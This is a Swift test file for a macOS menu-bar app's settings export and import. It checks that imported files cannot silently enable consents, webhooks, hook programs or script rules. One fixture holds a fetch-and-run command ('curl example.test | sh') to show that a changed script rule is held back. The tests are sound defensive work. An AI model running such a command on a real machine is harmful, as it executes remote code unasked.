import JRBarTestSupport
import Foundation
import JRBarCore
import Testing
@testable import JRBarApp

/// Settings export and import: what travels and what stays, the file
/// round-trips, a stranger's file is refused by name, and an import
/// writes only what this monitor knows and what actually changes.
@Suite(.temporaryDirectory) struct SettingsTransferTests {
    private let document: JSONValue = .object([
        "global_brightness_scale": .number(0.6),
        "claude_plan_limits_enabled": .bool(true),
        "claude_plan_limits_consent_version": .number(2),
        "cloud_ingest_token_path": .string("/Users/j/.local/state/jrbar/cloud-ingest.token"),
        "devices": .array([.object(["id": .string("pro-1"), "brightness": .number(0.4)])]),
    ])

    private func sample() -> SettingsBundle {
        var utilities = UtilitiesState()
        utilities.menuBar.rehideSeconds = 9
        return SettingsBundle.make(
            document: document, schema: 3, utilities: utilities, toys: ToysState(),
            defaults: [
                "panelHotkeyEnabled": NSNumber(value: true),
                "hotkeyChord.panel": "38:2304",
                "sound.volume": NSNumber(value: 0.5),
                "systemToggleStrip": ["awake", "dark"],
                "effectStudioSelection": "calm",
                "NSStatusItem Preferred Position jrbar": NSNumber(value: 120),
                "jrbar.askReplyDrafts.v1": "draft",
            ],
            appVersion: "0.9.9 (build 1801, 1800c0a)", now: Date(timeIntervalSince1970: 1_790_000_000))
    }

    @Test func whatTravelsAndWhatStays() {
        let bundle = sample()
        #expect(Set(bundle.monitor.keys) == ["global_brightness_scale", "claude_plan_limits_enabled",
                                             "claude_plan_limits_consent_version"])
        #expect(bundle.devices?.arrayValue?.count == 1)
        #expect(bundle.preferences["panelHotkeyEnabled"] == .bool(true), "a bool stays a bool")
        #expect(bundle.preferences["sound.volume"] == .number(0.5))
        #expect(bundle.preferences["hotkeyChord.panel"] == .string("38:2304"))
        #expect(bundle.preferences["systemToggleStrip"] == .array([.string("awake"), .string("dark")]))
        #expect(bundle.preferences["effectStudioSelection"] == nil)
        #expect(bundle.preferences["NSStatusItem Preferred Position jrbar"] == nil)
        #expect(bundle.preferences["jrbar.askReplyDrafts.v1"] == nil)
        #expect(bundle.categories == [.monitor, .devices, .utilities, .toys, .preferences])
        #expect(bundle.summary(of: .monitor) == "3 settings")
        #expect(bundle.summary(of: .devices) == "1 device")
        #expect(!SettingsBundle.Category.devices.onByDefault)
        #expect(SettingsBundle.Category.monitor.onByDefault)
    }

    @Test func theFileRoundTrips() throws {
        let bundle = sample()
        let data = try bundle.encoded()
        let read = try SettingsBundle.read(data)
        #expect(read == bundle)
        let text = String(decoding: data, as: UTF8.self)
        #expect(text.contains(#""format" : "jrbar-settings""#))
        #expect(!text.contains("cloud-ingest.token"), "a daemon fact never travels")
    }

    @Test func automaticSceneFactsAreNotExported() throws {
        let document: JSONValue = .object([
            "active_scene": .string("calm"),
            "scene_state": .object([
                "revision": .string("synthetic-revision"),
                "selected_scene": .string("calm"),
                "effective_scene": .string("focus"),
                "lease_id": .string("synthetic-lease"),
                "until": .number(2000),
            ]),
        ])
        let bundle = SettingsBundle.make(
            document: document, schema: CoreProtocol.knownSettingsSchema,
            utilities: nil, toys: nil, defaults: [:], appVersion: "synthetic",
            now: Date(timeIntervalSince1970: 1000))
        #expect(bundle.monitor == ["active_scene": .string("calm")])
        let exported = try JSONDecoder().decode(JSONValue.self, from: bundle.encoded())
        #expect(exported["monitor"]?["scene_state"] == nil)
        #expect(exported["monitor"]?["active_scene"] == .string("calm"))
    }

    @Test func olderExportsDoNotImportAutomaticSceneFacts() throws {
        let data = Data(#"""
        {"format":"jrbar-settings","version":1,"monitor":{
          "active_scene":"calm","scene_state":{"revision":"synthetic-old","effective_scene":"focus"}
        }}
        """#.utf8)
        let bundle = try SettingsBundle.read(data)
        #expect(bundle.monitor == ["active_scene": .string("calm")])
        let plan = bundle.monitorWrites(against: .object([
            "active_scene": .string("warm"),
            "scene_state": .object(["revision": .string("synthetic-current")]),
        ]))
        #expect(plan.writes.map(\.key) == ["active_scene"])
        #expect(plan.writes.first?.value == .string("calm"))
        #expect(plan.unknown.isEmpty)
        #expect(plan.needsYourOK.isEmpty)
    }

    @Test func aStrangersFileIsRefusedByName() {
        #expect(throws: SettingsBundle.ReadError.notJSON) { try SettingsBundle.read(Data("nope".utf8)) }
        #expect(throws: SettingsBundle.ReadError.notABundle) {
            try SettingsBundle.read(Data(#"{"global_brightness_scale": 1}"#.utf8))
        }
        #expect(throws: SettingsBundle.ReadError.newerVersion(9)) {
            try SettingsBundle.read(Data(#"{"format": "jrbar-settings", "version": 9}"#.utf8))
        }
    }

    @Test func aReadFileDropsWhatNeverTravels() throws {
        let json = #"""
        {"format": "jrbar-settings", "version": 1,
         "monitor": {"cloud_ingest_token_path": "/x", "devices": [], "dim_when_idle": true},
         "preferences": {"sound.volume": 0.3, "jrbar.lead": 4}}
        """#
        let read = try SettingsBundle.read(Data(json.utf8))
        #expect(read.monitor == ["dim_when_idle": .bool(true)])
        #expect(read.preferences == ["sound.volume": .number(0.3)])
    }

    @Test func anImportWritesOnlyKnownChangedKeysConsentFirst() {
        var bundle = sample()
        bundle.monitor["from_a_newer_monitor"] = .bool(true)
        bundle.monitor["claude_plan_limits_enabled"] = .bool(false)
        bundle.monitor["claude_plan_limits_consent_version"] = .number(0)
        let current: JSONValue = .object([
            "global_brightness_scale": .number(0.6),
            "claude_plan_limits_enabled": .bool(true),
            "claude_plan_limits_consent_version": .number(2),
        ])
        let plan = bundle.monitorWrites(against: current)
        #expect(plan.writes.map(\.key) == ["claude_plan_limits_consent_version", "claude_plan_limits_enabled"],
                "a file can switch a consent off, stamp first")
        #expect(plan.unknown == ["from_a_newer_monitor"])
        #expect(plan.needsYourOK.isEmpty)
    }

    @Test func anImportNeverSwitchesOnWhatLeavesTheMacOrRunsAProgram() {
        var bundle = SettingsBundle()
        bundle.monitor = [
            "claude_plan_limits_enabled": .bool(true),
            "claude_plan_limits_consent_version": .number(2),
            "provider_update_checks_enabled": .bool(true),
            "provider_status_feeds_enabled": .bool(true),
            "cloud_ingest_enabled": .bool(true),
            "escalation_webhook_url": .string("https://hooks.example.test/T000/B000/xyz"),
            "serve_enabled": .bool(true),
            "serve_answer_enabled": .bool(true),
            "usage_event_hook_path": .string("/tmp/hook.sh"),
            "remote_peers": .object(["enabled": .bool(true), "publish_enabled": .bool(true),
                                     "include_messages": .bool(true), "max_peers": .number(4)]),
            "usage_hooks": .object(["enabled": .bool(true),
                                    "rules": .array([.object(["id": .string("a"), "executable": .string("/bin/sh")])])]),
            "global_brightness_scale": .number(0.3),
        ]
        let current: JSONValue = .object([
            "claude_plan_limits_enabled": .bool(false),
            "claude_plan_limits_consent_version": .number(0),
            "provider_update_checks_enabled": .bool(false),
            "provider_status_feeds_enabled": .bool(false),
            "cloud_ingest_enabled": .bool(false),
            "escalation_webhook_url": .string(""),
            "serve_enabled": .bool(false),
            "serve_answer_enabled": .bool(false),
            "usage_event_hook_path": .string(""),
            "remote_peers": .object(["enabled": .bool(false), "publish_enabled": .bool(false),
                                     "include_messages": .bool(false), "max_peers": .number(8)]),
            "usage_hooks": .object(["enabled": .bool(false), "rules": .array([])]),
            "global_brightness_scale": .number(0.6),
        ])
        let plan = bundle.monitorWrites(against: current)
        let written = Dictionary(uniqueKeysWithValues: plan.writes.map { ($0.key, $0.value) })
        #expect(written == [
            "global_brightness_scale": .number(0.3),
            "remote_peers": .object(["enabled": .bool(false), "publish_enabled": .bool(false),
                                     "include_messages": .bool(false), "max_peers": .number(4)]),
        ], "the layout lands; every consent, secret and program stays as this Mac has it")
        #expect(plan.needsYourOK == [
            "Accept events from other machines", "Agent update checks", "Answering from the local endpoint", "Claude plan limits",
            "Escalation webhook", "Local status endpoint", "Provider status pages", "Remote machines", "Usage hooks",
        ])
    }

    @Test func anImportCanSwitchAConsentOffAndLeavesAnUnchangedOneAlone() {
        var bundle = SettingsBundle()
        bundle.monitor = ["cloud_ingest_enabled": .bool(false), "escalation_webhook_url": .string(""),
                          "provider_status_feeds_enabled": .bool(true)]
        let current: JSONValue = .object(["cloud_ingest_enabled": .bool(true),
                                          "escalation_webhook_url": .string("https://hooks.example.test/x"),
                                          "provider_status_feeds_enabled": .bool(true)])
        let plan = bundle.monitorWrites(against: current)
        #expect(Set(plan.writes.map(\.key)) == ["cloud_ingest_enabled", "escalation_webhook_url"])
        #expect(plan.needsYourOK.isEmpty, "a switch already on here is not a new request")
    }

    @Test func importedToysKeepThisMacsThirdPartyAndPermissionSwitches() {
        var imported = ToysState()
        imported.notch.lyrics = true
        imported.notch.lyricsConsented = true
        imported.notch.mirror = true
        imported.notch.audioVisualizer = true
        imported.notch.replaceSystemHUD = true
        imported.notch.meetingAlerts = true
        imported.notch.hudDuration = 4
        let kept = SettingsBundle.toysForImport(imported, over: ToysState())
        #expect(!kept.state.notch.lyrics)
        #expect(!kept.state.notch.lyricsConsented)
        #expect(!kept.state.notch.lyricsAllowed)
        #expect(!kept.state.notch.mirror)
        #expect(!kept.state.notch.audioVisualizer)
        #expect(!kept.state.notch.replaceSystemHUD)
        #expect(!kept.state.notch.meetingAlerts)
        #expect(kept.state.notch.hudDuration == 4)
        #expect(kept.needsYourOK == ["Audio visualizer", "Camera mirror", "Lyrics", "Meeting alerts",
                                     "Replace the volume and brightness HUD"])

        // A switch already on here stays on and is not a new ask.
        var mine = ToysState()
        mine.notch.lyrics = true
        mine.notch.lyricsConsented = true
        let again = SettingsBundle.toysForImport(imported, over: mine)
        #expect(again.state.notch.lyricsAllowed)
        #expect(!again.needsYourOK.contains("Lyrics"))
    }

    @Test func importedUtilitiesDoNotStartAccessibilityOnTheirOwn() {
        var imported = UtilitiesState()
        imported.dock.enabled = true
        imported.menuBar.enabled = true
        imported.dock.enhance.showThumbnails = false
        var mine = UtilitiesState()
        mine.dock.enabled = false
        mine.menuBar.enabled = false
        let kept = SettingsBundle.utilitiesForImport(imported, over: mine)
        #expect(!kept.state.dock.enabled)
        #expect(!kept.state.menuBar.enabled)
        #expect(!kept.state.dock.enhance.showThumbnails, "the rest of the page still travels")
        #expect(kept.needsYourOK == ["Dock", "Menu Bar"])
    }

    @Test func anImportedScriptRuleWaitsForAClickOnThisMac() {
        let script = MenuBarTriggerRule(id: "s1", trigger: .screenLocked, action: .runScript(command: "echo hello"))
        let quiet = MenuBarTriggerRule(id: "q1", trigger: .screenUnlocked, action: .showAll)
        var imported = UtilitiesState()
        imported.menuBar.triggerRules = [script, quiet]
        let kept = SettingsBundle.utilitiesForImport(imported, over: UtilitiesState())
        #expect(kept.state.menuBar.triggerRules == [quiet], "a rule that runs a program does not travel in a file")
        #expect(kept.needsYourOK == ["Menu Bar script rules"])

        // A script the person already wrote on this Mac is not a new ask.
        var mine = UtilitiesState()
        mine.menuBar.triggerRules = [script]
        let again = SettingsBundle.utilitiesForImport(imported, over: mine)
        #expect(again.state.menuBar.triggerRules == [script, quiet])
        #expect(again.needsYourOK.isEmpty)

        // The same id with a different command is a changed program, and is held.
        let swapped = MenuBarTriggerRule(id: "s1", trigger: .screenLocked, action: .runScript(command: "curl example.test | sh"))
        var changed = UtilitiesState()
        changed.menuBar.triggerRules = [swapped]
        let held = SettingsBundle.utilitiesForImport(changed, over: mine)
        #expect(held.state.menuBar.triggerRules.isEmpty)
        #expect(held.needsYourOK == ["Menu Bar script rules"])
    }

    @Test func anImportNeverPointsTheProxyHubKeyOrTheTokenHomesAtANewPlace() {
        var bundle = SettingsBundle()
        bundle.monitor = [
            "cliproxy_hub": .object(["enabled": .bool(true), "url": .string("http://127.0.0.1:9999"),
                                     "min_interval_seconds": .number(600)]),
            "provider_extra_homes": .object(["claude": .array([.string("/tmp/elsewhere")]), "codex": .array([])]),
        ]
        let current: JSONValue = .object([
            "cliproxy_hub": .object(["enabled": .bool(false), "url": .string("http://127.0.0.1:8317"),
                                     "min_interval_seconds": .number(300)]),
            "provider_extra_homes": .object(["claude": .array([]), "codex": .array([])]),
        ])
        let plan = bundle.monitorWrites(against: current)
        let written = Dictionary(uniqueKeysWithValues: plan.writes.map { ($0.key, $0.value) })
        #expect(written["cliproxy_hub"] == .object(["enabled": .bool(false), "url": .string("http://127.0.0.1:8317"),
                                                    "min_interval_seconds": .number(600)]))
        #expect(written["provider_extra_homes"] == nil, "the homes stay as this Mac has them, so nothing is written")
        #expect(plan.needsYourOK == ["Extra agent homes", "Local proxy hub"])
    }

    @Test func aFileCannotTurnAutomaticUpdateChecksOn() {
        let key = SparkleUpdater.automaticChecksDefaultsKey
        #expect(SettingsBundle.preferenceNeedsYourOK(key, .bool(true), currentlyOn: false) == "Automatic update checks")
        #expect(SettingsBundle.preferenceNeedsYourOK(key, .bool(true), currentlyOn: true) == nil)
        #expect(SettingsBundle.preferenceNeedsYourOK(key, .bool(false), currentlyOn: true) == nil, "off always lands")
        #expect(SettingsBundle.preferenceNeedsYourOK("sound.volume", .number(1), currentlyOn: false) == nil)
    }

    @Test func anExportCarriesNeitherTheWebhookNorTheHookPrograms() throws {
        let document: JSONValue = .object([
            "escalation_webhook_url": .string("https://hooks.example.test/T000/B000/xyz"),
            "usage_event_hook_path": .string("/tmp/hook.sh"),
            "usage_hooks": .object(["enabled": .bool(true),
                                    "rules": .array([.object(["executable": .string("/bin/sh")])])]),
            "cloud_ingest_enabled": .bool(true),
        ])
        let bundle = SettingsBundle.make(document: document, schema: 3, utilities: nil, toys: nil,
                                         defaults: [:], appVersion: "0.9.9", now: Date(timeIntervalSince1970: 0))
        let text = String(decoding: try bundle.encoded(), as: UTF8.self)
        #expect(!text.contains("hooks.example.test"))
        #expect(!text.contains("/tmp/hook.sh"))
        #expect(!text.contains("/bin/sh"))
        #expect(bundle.monitor["usage_hooks"] == .object(["enabled": .bool(true)]))
        #expect(bundle.monitor["cloud_ingest_enabled"] == .bool(true), "the switch travels so the import can name it")
    }

    @Test func aVersionThatIsNotANumberIsNotABundle() {
        #expect(throws: SettingsBundle.ReadError.notABundle) {
            try SettingsBundle.read(Data(#"{"format": "jrbar-settings", "version": "99"}"#.utf8))
        }
        #expect(throws: SettingsBundle.ReadError.notABundle) {
            try SettingsBundle.read(Data(#"{"format": "jrbar-settings"}"#.utf8))
        }
    }

    @Test func aVersionMustBeAPositiveWholeNumber() {
        for version in ["true", "false", "0", "-1", "1.5", "1e30"] {
            let json = "{\"format\": \"jrbar-settings\", \"version\": \(version)}"
            #expect(throws: SettingsBundle.ReadError.notABundle) {
                try SettingsBundle.read(Data(json.utf8))
            }
        }
    }

    @Test func anImportDoesNotEnableOrRedirectPhoneAlerts() {
        var bundle = SettingsBundle()
        bundle.monitor = ["ntfy_enabled": .bool(true), "ntfy_topic": .string("new-topic")]
        for enabled in [false, true] {
            let current: JSONValue = .object([
                "ntfy_enabled": .bool(enabled), "ntfy_topic": .string("this-macs-topic"),
            ])
            let plan = bundle.monitorWrites(against: current)
            #expect(plan.writes.isEmpty)
            #expect(plan.needsYourOK == ["Phone alerts"])
        }
        bundle.monitor = ["ntfy_enabled": .bool(false), "ntfy_topic": .string("")]
        let off = bundle.monitorWrites(against: .object([
            "ntfy_enabled": .bool(true), "ntfy_topic": .string("this-macs-topic"),
        ]))
        #expect(Set(off.writes.map(\.key)) == ["ntfy_enabled", "ntfy_topic"])
        #expect(off.needsYourOK.isEmpty)
    }

    @Test func anImportDoesNotBroadenWebhooksOrInstallAStatusLine() {
        var bundle = SettingsBundle()
        bundle.monitor = [
            "webhook_events": .array([.string("completed"), .string("ask")]),
            "claude_statusline_source": .bool(true),
        ]
        let current: JSONValue = .object([
            "webhook_events": .array([.string("ask")]),
            "claude_statusline_source": .bool(false),
        ])
        let plan = bundle.monitorWrites(against: current)
        #expect(plan.writes.isEmpty)
        #expect(plan.needsYourOK == ["Claude status line", "Escalation webhook"])
    }

    @Test func anImportCannotRemoveTheAwayOnlyPhoneGate() {
        var bundle = SettingsBundle()
        bundle.monitor = ["ntfy_only_when_away": .bool(false)]
        let held = bundle.monitorWrites(against: .object(["ntfy_only_when_away": .bool(true)]))
        #expect(held.writes.isEmpty)
        #expect(held.needsYourOK == ["Phone alerts"])
        let unchanged = bundle.monitorWrites(against: .object(["ntfy_only_when_away": .bool(false)]))
        #expect(unchanged.writes.isEmpty)
        #expect(unchanged.needsYourOK.isEmpty)
        bundle.monitor = ["ntfy_only_when_away": .bool(true)]
        let restricted = bundle.monitorWrites(against: .object(["ntfy_only_when_away": .bool(false)]))
        #expect(restricted.writes.map(\.key) == ["ntfy_only_when_away"])
        #expect(restricted.needsYourOK.isEmpty)
    }

    @Test func anExportLeavesMenuBarProgramsOnTheirMac() throws {
        var utilities = UtilitiesState()
        let script = MenuBarTriggerRule(id: "private-script", trigger: .screenLocked,
                                        action: .runScript(command: "echo synthetic-private-token"))
        let quiet = MenuBarTriggerRule(id: "quiet", trigger: .screenUnlocked, action: .showAll)
        utilities.menuBar.triggerRules = [script, quiet]
        let bundle = SettingsBundle.make(document: nil, schema: nil, utilities: utilities,
                                         toys: nil, defaults: [:], appVersion: "test", now: .distantPast)
        let text = String(decoding: try bundle.encoded(), as: UTF8.self)
        #expect(!text.contains("synthetic-private-token"))
        let read = try SettingsBundle.read(Data(text.utf8))
        #expect(SettingsBundle.decode(UtilitiesState.self, from: read.utilities)?.menuBar.triggerRules == [quiet])
        #expect(utilities.menuBar.triggerRules == [script, quiet], "export does not change the live rules")
    }

    @Test func anOversizedInMemoryFileIsRefusedBeforeDecoding() {
        let data = Data(repeating: 32, count: SettingsBundle.maxFileBytes + 1)
        #expect(throws: SettingsBundle.ReadError.tooLarge) { try SettingsBundle.read(data) }
    }

    @Test func anEmptyPageIsNotOfferedForImport() throws {
        let json = #"""
        {"format": "jrbar-settings", "version": 1, "utilities": {}, "toys": {}}
        """#
        let read = try SettingsBundle.read(Data(json.utf8))
        #expect(read.categories.isEmpty, "an empty object would reset the page to its defaults")
    }

    @Test func anUnknownOnlyPageIsNotOfferedForImport() throws {
        let json = #"""
        {"format": "jrbar-settings", "version": 1,
         "utilities": {"dataHoarder": {"enabled": true}, "futureUtility": {}},
         "toys": {"externalApps": [], "futureToy": {"enabled": true}}}
        """#
        let read = try SettingsBundle.read(Data(json.utf8))
        #expect(read.categories.isEmpty, "unknown sections must not replace a current page with defaults")
    }

    @Test func recognizedPagesAndTheLegacyAlcoveAreStillOffered() throws {
        let json = #"""
        {"format": "jrbar-settings", "version": 1,
         "utilities": {"menuBar": {"rehideSeconds": 9}, "futureUtility": null},
         "toys": {"alcove": {"hudDuration": 4}, "futureToy": 7}}
        """#
        let read = try SettingsBundle.read(Data(json.utf8))
        #expect(read.categories == [.utilities, .toys])
        #expect(SettingsBundle.decode(UtilitiesState.self, from: read.utilities)?.menuBar.rehideSeconds == 9)
        #expect(SettingsBundle.decode(ToysState.self, from: read.toys)?.notch.hudDuration == 4)
    }

    @Test func malformedRecognizedSectionsAreNamedInsteadOfResettingAPage() throws {
        let examples: [(page: String, key: String, value: JSONValue)] = [
            ("Utilities", "menuBar", .null),
            ("Utilities", "dock", .number(7)),
            ("Utilities", "enabled", .object([:])),
            ("Toys", "aquarium", .bool(true)),
            ("Toys", "alcove", .string("bad")),
            ("Toys", "hushDuringQuiet", .null),
        ]
        for example in examples {
            var bundle = SettingsBundle()
            let fields: JSONValue = .object([example.key: example.value])
            if example.page == "Utilities" { bundle.utilities = fields } else { bundle.toys = fields }
            #expect(bundle.categories.isEmpty)
            let data = try bundle.encoded()
            #expect(throws: SettingsBundle.ReadError.malformedPage(example.page)) {
                try SettingsBundle.read(data)
            }
        }

        // A valid section does not hide a malformed sibling.
        var mixed = SettingsBundle()
        mixed.toys = .object(["notch": .object(["hudDuration": .number(4)]), "aquarium": .null])
        #expect(mixed.categories.isEmpty)
        let data = try mixed.encoded()
        #expect(throws: SettingsBundle.ReadError.malformedPage("Toys")) { try SettingsBundle.read(data) }
    }

    @Test func theExportIsPrivateAndAReplaceStaysPrivate() throws {
        let folder = TestTemporaryDirectory.currentURL
            .appendingPathComponent("jrbar-transfer-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let url = folder.appendingPathComponent("JR-Bar Settings.json")
        func mode() throws -> Int {
            (try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? Int) ?? -1
        }
        let bundle = sample()
        try bundle.write(to: url)
        #expect(try mode() == 0o600)
        #expect(try SettingsBundle.read(contentsOf: url) == bundle)

        // Replacing a file that was world-readable ends private too.
        try FileManager.default.setAttributes([.posixPermissions: 0o644], ofItemAtPath: url.path)
        try bundle.write(to: url)
        #expect(try mode() == 0o600)
        let leftovers = try FileManager.default.contentsOfDirectory(atPath: folder.path)
        #expect(leftovers == ["JR-Bar Settings.json"], "no staging file is left behind")
    }

    @Test func aHugeFileIsRefusedBeforeItIsLoaded() throws {
        let url = TestTemporaryDirectory.currentURL
            .appendingPathComponent("jrbar-huge-\(UUID().uuidString).json")
        defer { try? FileManager.default.removeItem(at: url) }
        FileManager.default.createFile(atPath: url.path, contents: nil)
        let handle = try FileHandle(forWritingTo: url)
        try handle.truncate(atOffset: UInt64(SettingsBundle.maxFileBytes + 1))
        try handle.close()
        #expect(throws: SettingsBundle.ReadError.tooLarge) { try SettingsBundle.read(contentsOf: url) }
    }

    @Test func anImportedChordPassesTheRecordersGate() throws {
        let json = #"""
        {"format": "jrbar-settings", "version": 1,
         "preferences": {"hotkeyChord.panel": "0:0", "hotkeyChord.shelf": "49:256",
                         "hotkeyChord.a": "0:256", "hotkeyChord.b": "38:6144",
                         "hotkeyChord.c": "", "hotkeyChord.d": "banana", "hotkeyChord.e": 7}}
        """#
        let read = try SettingsBundle.read(Data(json.utf8))
        func gate(_ id: String) -> SettingsBundle.ImportedChord {
            SettingsBundle.importedChord(read.preferences["hotkeyChord.\(id)"])
        }
        #expect(gate("panel") == .refused, "a bare A would be taken from typing everywhere")
        #expect(gate("shelf") == .refused, "⌘Space is Spotlight's")
        #expect(gate("a") == .refused, "⌘ alone is every app's menu shortcut")
        #expect(gate("b") == .chord(HotkeyChord(keyCode: 38, modifiers: 6144)))
        #expect(gate("c") == .unbound, "an empty chord is the recorder's Delete")
        #expect(gate("d") == .refused)
        #expect(gate("e") == .refused)
        // The file keeps them, so the import can name what it skipped.
        #expect(read.preferences["hotkeyChord.panel"] == .string("0:0"))
    }

    @Test func aPagesStateReadsBackTolerantly() {
        let bundle = sample()
        #expect(SettingsBundle.decode(UtilitiesState.self, from: bundle.utilities)?.menuBar.rehideSeconds == 9)
        #expect(SettingsBundle.decode(ToysState.self, from: .object([:])) == ToysState())
        #expect(SettingsBundle.decode(ToysState.self, from: .string("garbage")) == nil)
        #expect(SettingsBundle.decode(ToysState.self, from: nil) == nil)
    }

    @Test func defaultsValuesComeBackAsDefaultsTypes() {
        #expect(SettingsBundle.defaultsValue(.bool(true)) as? Bool == true)
        #expect(SettingsBundle.defaultsValue(.array([.string("a")])) as? [String] == ["a"])
        #expect(SettingsBundle.defaultsValue(.array([.number(1)])) == nil)
        #expect(SettingsBundle.defaultsValue(.object([:])) == nil)
    }

    @MainActor @Test func theSpelledOutKeysAreTheOwnersKeys() {
        #expect(SettingsBundle.preferenceKeys.contains(PanelHotkey.defaultsKey))
        #expect(SettingsBundle.preferenceKeys.contains(SettingsStore.shelfHotkeyDefaultsKey))
        #expect(SettingsBundle.travels(HotkeyChordDefaults.key(for: "panel")))
        #expect(SettingsBundle.travels(SoundPreferences.volumeKey))
        #expect(SettingsBundle.travels(SoundPreferences.choiceKey(.completion)))
    }
}
